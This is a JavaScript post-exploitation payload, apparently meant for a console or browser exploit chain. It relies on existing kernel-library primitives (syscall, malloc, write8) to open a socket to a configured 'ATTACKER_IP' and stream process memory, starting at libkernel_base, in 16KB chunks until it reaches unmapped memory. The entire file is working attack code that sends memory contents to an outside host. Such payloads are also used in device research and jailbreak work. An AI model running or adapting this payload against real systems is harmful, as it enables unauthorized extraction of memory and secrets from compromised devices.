(async function() {
    try {
        // ================= CONFIGURATION =================
        var ATTACKER_IP = "192.168.1.200"; 
        var ATTACKER_PORT = 8081;
        var CHUNK_SIZE = 0x4000n;         // 16KB Chunks
        // =================================================

        // Helper to log to screen (if available) or console
        async function log(msg) {
            console.log(msg);
            if (typeof pL === "function") pL(msg); 
        }

        if (typeof libkernel_base === 'undefined') {
            await log("[-] libkernel_base missing.");
            return;
        }

        await log("[*] STARTING UNLIMITED MEMORY DUMP...");
        await log("[*] Base: " + "0x" + libkernel_base.toString(16));

        // 1. CONNECT
        // Ensure SYSCALL constants are defined. If not, use standard FreeBSD numbers.
        const SYS_socket = 97n;
        const SYS_connect = 98n;
        const SYS_write = 4n;
        const SYS_close = 6n;
        
        // Setup socket
        var sock = syscall(SYS_socket, 2n, 1n, 0n); // AF_INET, SOCK_STREAM
        if (Number(sock) < 0) throw new Error("Socket creation failed");

        var sockaddr = malloc(16);
        for(let i=0; i<16; i++) write8(sockaddr + BigInt(i), 0);

        write8(sockaddr + 1n, 2); // AF_INET
        write8(sockaddr + 2n, (ATTACKER_PORT >> 8) & 0xFF); 
        write8(sockaddr + 3n, ATTACKER_PORT & 0xFF);
        
        var ip_parts = ATTACKER_IP.split('.');
        write8(sockaddr + 4n, parseInt(ip_parts[0]));
        write8(sockaddr + 5n, parseInt(ip_parts[1]));
        write8(sockaddr + 6n, parseInt(ip_parts[2]));
        write8(sockaddr + 7n, parseInt(ip_parts[3]));

        await log("[*] Connecting to " + ATTACKER_IP + ":" + ATTACKER_PORT + "...");
        var ret = syscall(SYS_connect, sock, sockaddr, 16n);
        
        if (Number(ret) !== 0) {
            syscall(SYS_close, sock);
            throw new Error("Connection failed: " + ret);
        }

        await log("[+] Connected! Dumping until unmapped memory...");

        // 2. UNLIMITED STREAM LOOP
        var total_dumped = 0n;
        var offset = 0n;
        var keep_dumping = true;

        while (keep_dumping) {
            var current_addr = libkernel_base + offset;
            
            // DIRECT SYSCALL: Memory -> Socket
            // If current_addr is unmapped, syscall returns -1 (EFAULT) without crashing process.
            var bytes_written = syscall(SYS_write, sock, current_addr, CHUNK_SIZE);
            
            // EXIT CONDITION: If we fail to write, we hit the end of mapped memory.
            if (Number(bytes_written) <= 0) {
                await log("[!] End of mapped memory reached at offset " + "0x" + offset.toString(16));
                keep_dumping = false;
                break;
            }

            total_dumped += bytes_written;
            offset += CHUNK_SIZE;

            // Yield every 1MB (0x100000) to keep Watchdog happy and UI responsive
            if (offset % 0x100000n === 0n) {
                await new Promise(r => setTimeout(r, 0)); 
                // Optional: Print status every 10MB to avoid spam
                if (offset % 0xA00000n === 0n) {
                    await log("dumped: " + "0x" + offset.toString(16));
                }
            }
        }

        syscall(SYS_close, sock);
        await log("[+] DUMP COMPLETE. Total: " + "0x" + total_dumped.toString(16));

    } catch (e) {
        console.log(e);
        await log("[-] Error: " + e.message);
    }
})();
